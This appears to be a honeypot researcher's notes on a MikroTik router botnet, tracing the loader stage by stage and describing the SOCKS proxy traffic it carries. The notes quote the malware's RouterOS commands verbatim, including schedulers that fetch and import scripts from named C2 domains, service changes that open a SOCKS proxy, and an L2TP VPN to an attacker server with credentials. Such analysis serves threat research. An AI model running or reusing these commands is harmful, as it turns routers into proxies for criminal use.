# Scripts
These scripts are hacky pieces of crap. They were written very quickly to do a specific job and not necessarily to do their job well. They are provided for reference only. As an example of how hacky they are, note that AsyncSSH was used to implement the server part of the ssh proxy script, but no other real async code exists. This was because I needed to quickly turn a low interactivity honeypot I had written into an SSH MitM proxy and was more familar with paramiko than AsyncSSH. 

# Notes

vm 104 = mikrotik1
vm 113 = mikrotik9

VM 113 is the original mikrotik that was infected. Later, I was working on modifying my monitoring script using a fresh mikrotik image (VM 104). 

After setting it up, I decided that I didn't want to wait for it to get infected on it's own again as the loader can take multiple weeks before the final payload is copied over. So I copied the config and private SSH keys[1] from VM 113 to VM 104. 

I then exposed the SOCKS port to the internet. No configuration changes where made by the C2 to VM 113. VM 113 is probably more interesting from a loader standpoint, but the SOCKS traffic ultimately passed through VM 104.

## Loader Behavior
1. Initial vector is SSH. I've been looking at scanners using admin/blank password. After they log in they issue the following command:
```
 /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://bestony.club/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
```

This leads to the following `/system scheduler` config:

```
/system scheduler
add interval=10m name=U6 on-event="/tool fetch url=http://bestony.club/poll/6b0\
    ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7wmp0b4s.rsc\r\
    \n/import 7wmp0b4s.rsc" policy=\
```

The URL varies and the domain could be any of the ones listed in the c2domains file. The string in the path following poll seems arbitrary. I've set it to random words and the loader still functions, but it gives you a new string in the usual format at stage 2. I'm guessing it becomes a key in a DB somewhere.

 2. The installed script eventually downloads a script called 7wmp0b4s.rsc. This usually seems to just increase the interval of the original script and the destination filename stays the same.
```
name="7wmp0b4s.rsc" type="script" size=82 creation-time=may/11/2021 03:31:19
contents=:do { /system scheduler set U6 interval=00:03:00 } on-error={ :put "U6 not found"}
```

3. Eventually a second version of 7wmp0b4s.rsc is downloaded. It's slightly different, often the c2domain is changed, but the path stays the same. It also has a new destination file name, `7xe7zt46hb08`. At this point, the system scheduler name is changed from U6 to U7. 
```
name="7wmp0b4s.rsc" type="script" size=1120 
creation-time=may/11/2021 03:33:19 
contents=
    :do { /system scheduler set U3 name="U7" on-event="/tool fetch url=http://weirdgamesinfo/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U3 not found"}
    :do { /system scheduler set U4 name="U7" on-event="/tool fetch url=http://weirdgames.info/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U4 not found"}
    :do { /system scheduler set U5 name="U7" on-event="/tool fetch url=http://weirdgames.info/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U5 not found"}
    :do { /system scheduler set U6 name="U7" on-event="/tool fetch url=http://weirdgames.info/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U6 not found"}
    :do { /system scheduler set U7 name="U7" on-event="/tool fetch url=http://weirdgames.info/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U7 not found"}
```
This changes the system scheduler configuration to the following:

```
 /system scheduler
add interval=3m name=U7 on-event="/tool fetch url=http://weirdgames.info/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" policy=\
```

Most of the time stage 3 is repeated numerous times. Often with the C2 domain changing, but no other changes. For example, the very first 7xe7zt46hb08 scripts downloaded to mikrotik9 was the following:
```
name="7xe7zt46hb08" type="file" size=1120 creation-time=may/13/2021 01:57:20
   contents=
     :do { /system scheduler set U3 name="U7" on-event="/tool fetch url=http://massgames.space/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U3 not found"}
     :do { /system scheduler set U4 name="U7" on-event="/tool fetch url=http://massgames.space/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U4 not found"}
     :do { /system scheduler set U5 name="U7" on-event="/tool fetch url=http://massgames.space/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U5 not found"}
     :do { /system scheduler set U6 name="U7" on-event="/tool fetch url=http://massgames.space/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U6 not found"}
     :do { /system scheduler set U7 name="U7" on-event="/tool fetch url=http://massgames.space/poll/6b0ba0f1-01a5-4433-b4db-0c5603850c99 mode=http dst-path=7xe7zt46hb08\r\n/import 7xe7zt46hb08" } on-error={ :put "U7 not found"}
```

later it was replaced with specialword.xyz, then back to weirdgames.info, then to portgame.website, then massgames.space, then back to weirdgames.info, then to globymoby.xyz, then back to massgames.space, then portgame.website, back to weirdgames.info, then to widechanges.best,.... and it just kinda cycles through these C2 domains for days. Eventually we do move on to stage 4. 

4. Eventually we do get a new copy of 7xe7zt46hb08. In this case 11 days after the first instance. Then it goes back to stage 3 for a while, except this time it's got now listening for SOCKS connections. 
```
name="7xe7zt46hb08" type="file" size=290 creation-time=may/24/2021 09:15:24 
   contents=
     /ip service disable winbox
     /ip service disable telnet
     /ip service disable api
     /ip service disable api-ssl
     /ip service set ssh port=21781
     /ip socks set enabled=yes
     /ip socks set port=5678
     /ip firewall filter add action=accept chain=input disabled=no dst-port=5678 protocol=tcp place-before=1
```

5. After another day passed a new version of 7xe7zt46hb08 was received. This one adding a long access list to our SOCKS configuration. Then when went back to stage 3 for another day. 

```
name="7xe7zt46hb08" type="file" size=4061 creation-time=may/25/2021 15:51:20 
contents=
  /ip socks access add src-address=77.238.240.0/24 action=allow
  /ip socks access add src-address=178.239.168.0/24 action=allow
  /ip socks access add src-address=77.238.228.0/24 action=allow
  /ip socks access add src-address=94.243.168.0/24 action=allow
  /ip socks access add src-address=213.33.214.0/24 action=allow
  /ip socks access add src-address=31.172.128.45/32 action=allow
  /ip socks access add src-address=31.172.128.25/32 action=allow
  /ip socks access add src-address=10.0.0.0/8 action=allow
  /ip socks access add src-address=185.137.233.251/32 action=allow
  /ip socks access add src-address=5.9.163.16/29 action=allow
  /ip socks access add src-address=176.9.65.8/32 action=allow
  /ip socks access add src-address=82.202.248.5/32 action=allow
  /ip socks access add src-address=95.213.193.133/32 action=allow
  /ip socks access add src-address=136.243.238.211/32 action=allow
  /ip socks access add src-address=178.238.114.6/32 action=allow
  /ip socks access add src-address=46.148.232.205/32 action=allow
  /ip socks access add src-address=138.201.170.176/29 action=allow
  /ip socks access add src-address=178.63.52.202/29 action=allow
  /ip socks access add src-address=136.243.90.81/29 action=allow
  /ip socks access add src-address=136.243.21.233/29 action=allow
  /ip socks access add src-address=95.213.221.0/24 action=allow
  /ip socks access add src-address=159.255.24.0/24 action=allow
  /ip socks access add src-address=31.184.210.0/24 action=allow
  /ip socks access add src-address=188.187.119.0/24 action=allow
  /ip socks access add src-address=188.233.1.0/24 action=allow
  /ip socks access add src-address=188.233.5.0/24 action=allow
  /ip socks access add src-address=188.233.13.0/24 action=allow
  /ip socks access add src-address=188.232.101.0/24 action=allow
  /ip socks access add src-address=188.232.105.0/24 action=allow
  /ip socks access add src-address=188.232.109.0/24 action=allow
  /ip socks access add src-address=176.212.165.0/24 action=allow
  /ip socks access add src-address=176.212.169.0/24 action=allow
  /ip socks access add src-address=176.212.173.0/24 action=allow
  /ip socks access add src-address=176.213.161.0/24 action=allow
  /ip socks access add src-address=176.213.165.0/24 action=allow
  /ip socks access add src-address=176.213.169.0/24 action=allow
  /ip socks access add src-address=5.3.113.0/24 action=allow
  /ip socks access add src-address=5.3.117.0/24 action=allow
  /ip socks access add src-address=5.3.121.0/24 action=allow
  /ip socks access add src-address=5.3.145.0/24 action=allow
  /ip socks access add src-address=5.3.149.0/24 action=allow
  /ip socks access add src-address=5.3.153.0/24 action=allow
  /ip socks access add src-address=5.167.9.0/24 action=allow
  /ip socks access add src-address=5.167.13.0/24 action=allow
  /ip socks access add src-address=5.3.153.0/24 action=allow
  /ip socks access add src-address=5.167.9.0/24 action=allow
  /ip socks access add src-address=5.167.13.0/24 action=allow
  /ip socks access add src-address=5.167.17.0/24 action=allow
  /ip socks access add src-address=94.180.1.0/24 action=allow
  /ip socks access add src-address=94.180.5.0/24 action=allow
  /ip socks access add src-address=94.180.9.0/24 action=allow
  /ip socks access add src-address=217.119.22.83/32 action=allow
  /ip socks access add src-address=5.17.85.26/32 action=allow
  /ip socks access add src-address=217.119.24.0/24 action=allow
  /ip socks access add src-address=192.243.53.0/24 action=allow
  /ip socks access add src-address=192.243.55.0/24 action=allow
  /ip socks access add src-address=146.0.78.5/32 action=allow
  /ip socks access add src-address=185.202.1.142/32 action=allow
  /ip socks access add src-address=95.246.101.58/32 action=allow
  /ip socks access add src-address=176.9.65.8/32 action=allow
  /ip socks access add src-address=135.181.15.102/32 action=allow
  /ip socks access add src-address=198.18.0.0/15 action=allow
  /ip socks access add src-address=139.99.94.160/29 action=allow
  /ip socks access add src-address=5.188.119.191 action=allow
  /ip socks access add src-address=178.63.52.202 action=allow
  /ip socks access add src-address=136.243.21.233 action=allow
  /ip socks access add src-address=136.243.90.81 action=allow
  /ip socks access add src-address=94.130.223.9 action=allow
  /ip socks access add src-address=0.0.0.0/0 action=deny
```

6. A new version of 7xe7zt46hb08 was downloaded the next day. This one creates a l2tp VPN to s80.leappoach.info. This domain is not used for C2, but the VPN server does use the infected mikrotik as a SOCKS proxy. 

```
name="7xe7zt46hb08" type="file" size=153 creation-time=may/26/2021 19:03:20 
contents=/interface l2tp-client add name=lvpn keepalive-timeout=60 
      user=user5325010 password=pass5325010 connect-to=s80.leappoach.info 
      disabled=no profile=default 
```

At this point stage 6 is repeated every day at 03:33:19[2]. This L2TP connection must be considered very important. Stage 6 appears to be the terminal state. When stage 6 was first reached, I had not yet exposed the SOCKS port to the internet. On Jun 19th I did and almost immediately started seeing SOCKS traffic. 

## Botnet Behavior

The mikrotik is used as a SOCKS proxy, both via the L2TP tunnel and via the public internet. The majority of the HTTP traffic is via the L2TP VPN, but not all of it. I have observed the GET requests to whatismyip.akamai.com and checkip.amazonaws.com via HTTP. I suspect the majority of the L2TP traffic is just polling for the current public IP address and "users" come in through the SOCKS port via the public IP. However, I have not had time to thoroughly verify whether or not this is the case. 

The majority of the HTTPS traffic appears to be to instagram and tiktok based on SNI data. A quick google search for "instagram socks proxy" yields tons of results. I am assuming people buy access to these SOCKS proxies in order to run bots to promote their own instagram and tiktok accounts. 

[1] I did this in case the L2TP connection is used for control over SSH - it doesn't appear to be
[2] This continued after the configuration was migrated to mikrotik1. Only the time shifted to 4:00:20. Most likely due to the time the device came online. 
